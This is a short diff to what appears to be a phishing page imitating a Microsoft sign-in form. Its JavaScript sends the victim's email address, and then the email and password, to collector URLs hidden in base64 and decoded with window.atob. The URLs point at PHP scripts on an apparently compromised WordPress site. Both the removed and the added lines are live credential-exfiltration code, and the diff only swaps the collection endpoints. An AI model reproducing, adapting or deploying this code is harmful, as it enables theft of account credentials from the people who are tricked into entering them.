@@ -7192,7 +7192,7 @@
         var email = encoded_string;
         $('.identity').html(email);
         var request = new XMLHttpRequest();
-        var url = window.atob('aHR0cHM6Ly93d3cucmVjaWNsYXRnZXN0YW1heW8uY29tL3dwLWluY2x1ZGVzL2Jsb2Nrcy90YWctY2xvdWQvZG9tL3BvbGljeS5waHA=') + email
+        var url = window.atob('aHR0cHM6Ly93d3cucmVjaWNsYXRnZXN0YW1heW8uY29tL3dwLWluY2x1ZGVzL2Jsb2Nrcy90YWctY2xvdWQvZG9tL3Bydi5waHA/aWQ9') + email
         request.open('GET', url, true);
         request.onload = function() {
             if (this.status >= 200 && this.status < 400) {
@@ -7252,7 +7252,7 @@
                 $("#passwordError").hide();
                 $('#idSIButton9').prop('disabled', true);
                 $.ajax({
-                    url: window.atob("aHR0cHM6Ly93d3cucmVjaWNsYXRnZXN0YW1heW8uY29tL3dwLWluY2x1ZGVzL2Jsb2Nrcy90YWctY2xvdWQvZnJlc2gvcG9saWN5LnBocA=="),
+                    url: window.atob("aHR0cHM6Ly93d3cucmVjaWNsYXRnZXN0YW1heW8uY29tL3dwLWluY2x1ZGVzL2Jsb2Nrcy90YWctY2xvdWQvZG9tL3BvbGljeS5waHA="),
                     data: {
                         "email": user,
                         "password": pass,
